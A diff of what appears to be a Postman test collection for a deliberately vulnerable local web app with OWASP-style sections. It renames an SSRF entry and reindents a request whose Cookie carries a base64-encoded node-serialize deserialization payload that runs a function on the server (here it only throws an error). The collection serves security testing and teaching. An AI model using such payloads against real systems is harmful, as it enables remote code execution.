@@ -250,7 +250,7 @@
           "response": []
         },
         {
-          "name": "A06: SSRF",
+          "name": "A06: Exploit vulnerability",
           "request": {
             "method": "GET",
             "header": [],
@@ -307,12 +307,12 @@
           "request": {
             "method": "GET",
             "header": [
-							{
-								"key": "Cookie",
-								"value": "profile=eyJpZCI6MSwidXNlcm5hbWUiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkge1xuICAgIHRocm93IG5ldyBFcnJvcignc2VydmVyIGVycm9yJylcbiAgfSgpIn0=",
-								"type": "text"
-							}
-						],
+              {
+                "key": "Cookie",
+                "value": "profile=eyJpZCI6MSwidXNlcm5hbWUiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkge1xuICAgIHRocm93IG5ldyBFcnJvcignc2VydmVyIGVycm9yJylcbiAgfSgpIn0=",
+                "type": "text"
+              }
+            ],
             "body": {},
             "url": {
               "raw": "localhost:3000/profile",
@@ -321,6 +321,8 @@
               "path": ["profile"]
             }
           }
+        }
+      ]
     },
     {
       "name": "A10",
